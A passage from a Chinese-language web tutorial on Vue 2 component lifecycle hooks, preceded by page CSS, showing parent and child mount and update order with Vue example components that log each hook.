35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">vue2版本</h2>
<blockquote>
<p>生命周期：</p>
<p>beforeCreate created beforeMount mounted beforeUpdate updated beforeDestroy destroyed activated deactivated</p>
</blockquote>
<h3 data-id="heading-1">1. 组件挂载阶段（Mounting）</h3>
<h4 data-id="heading-2">执行顺序：</h4>
<pre><code class="hljs language-arduino" lang="arduino">​
<span class="hljs-comment">// 创建和挂载过程</span>
​
父组件 beforeCreate
​
父组件 created
​
父组件 beforeMount
​
  子组件 beforeCreate
​
  子组件 created
​
  子组件 beforeMount
​
  子组件 mounted
​
父组件 mounted
</code></pre>
<h4 data-id="heading-3">代码示例：</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
​
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Child.vue'</span>
​
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Parent'</span>,
  <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
  <span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 父组件 beforeCreate'</span>)
  },
  <span class="hljs-title function_">created</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. 父组件 created'</span>)
  },
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. 父组件 beforeMount'</span>)
  },
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'6. 父组件 mounted'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>子组件<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
​
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Child'</span>,
  <span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 子组件 beforeCreate'</span>)
  },
  <span class="hljs-title function_">created</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4.1 子组件 created'</span>)
  },
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4.2 子组件 beforeMount'</span>)
  },
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5. 子组件 mounted'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
</code></pre>
<h3 data-id="heading-4">2. 组件更新阶段（Updating）</h3>
<h4 data-id="heading-5">总结：</h4>
<blockquote>
<p>vue2中，只要子组件使用了，父组件传入的值，当该值更新时，子组件的更新生命周期就会执行，其他情况，子组件的更新生命周期都不会执行</p>
</blockquote>
<h4 data-id="heading-6">更新父组件--子组件使用了，父组件传入的参数</h4>
<h5 data-id="heading-7">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 更新过程（数据变化时）</span>
​
父组件 beforeUpdate
​
  子组件 beforeUpdate
​
  子组件 updated
​
父组件 updated
</code></pre>
<h5 data-id="heading-8">代码示例：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件 - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>改变数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
​
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Child.vue'</span>
​
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">parentData</span>: <span class="hljs-string">'初始值'</span>
    }
  },
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">changeData</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentData</span> = <span class="hljs-string">'新值'</span>
    }
  },
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 父组件 beforeUpdate'</span>)
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 父组件 updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>子组件 - {{ childData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
​
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">props</span>: [<span class="hljs-string">'childData'</span>],
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. 子组件 beforeUpdate'</span>)
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. 子组件 updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-9">更新父组件--子组件没有使用，父组件传入的参数（即使有传入值给子组件）</h4>
<h5 data-id="heading-10">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 更新过程（数据变化时）</span>
​
父组件 beforeUpdate
​
父组件 updated
</code></pre>
<h5 data-id="heading-11">代码示例：</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件 - {{ parentData }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeData"</span>&gt;</span>改变数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:childData</span>=<span class="hljs-string">"parentData"</span> /&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;ChildComponent :childData="parentData" /&gt; --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/two/Child.vue'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">components</span>: { <span class="hljs-title class_">ChildComponent</span> },
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">parentData</span>: <span class="hljs-string">'初始值'</span>
    }
  },
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">changeData</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentData</span> = <span class="hljs-string">'新值'</span>
    }
  },
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. 父组件 beforeUpdate'</span>)
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. 父组件 updated'</span>)
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
​
​
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
